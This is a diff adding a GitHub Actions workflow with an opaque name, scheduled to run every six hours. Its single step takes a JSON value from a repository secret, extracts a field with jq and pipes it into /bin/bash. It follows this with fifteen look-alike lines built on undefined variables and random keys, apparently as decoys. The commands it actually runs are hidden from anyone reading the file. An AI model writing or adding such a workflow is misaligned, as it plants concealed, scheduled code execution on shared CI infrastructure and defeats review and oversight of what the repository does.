@@ -1,0 +1,32 @@
+name: eiweishenmezhenjing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: eiweishenmezhenjing
+        env:
+          b34: ${{ secrets.b34 }}
+        run: |
+          echo $b34 | jq -r .mt168 | /bin/bash
+          echo $flnx04526 | jq -r .zbw94074 | /bin/bash
+          echo $egi455 | jq -r .ai2 | /bin/bash
+          echo $lrv0 | jq -r .smmx0847 | /bin/bash
+          echo $uxsr9 | jq -r .ywcvl545 | /bin/bash
+          echo $bzu20577 | jq -r .wyi32 | /bin/bash
+          echo $k53629 | jq -r .vfx28 | /bin/bash
+          echo $lqrio23713 | jq -r .lx5 | /bin/bash
+          echo $q04 | jq -r .bh10 | /bin/bash
+          echo $kc067 | jq -r .xxzt09040 | /bin/bash
+          echo $w0 | jq -r .xk4 | /bin/bash
+          echo $dyt5262 | jq -r .mljhx80185 | /bin/bash
+          echo $q00403 | jq -r .i64257 | /bin/bash
+          echo $xarch9 | jq -r .by0529 | /bin/bash
+          echo $aymv68 | jq -r .zind015 | /bin/bash
+          echo $luspr60612 | jq -r .x86247 | /bin/bash
+
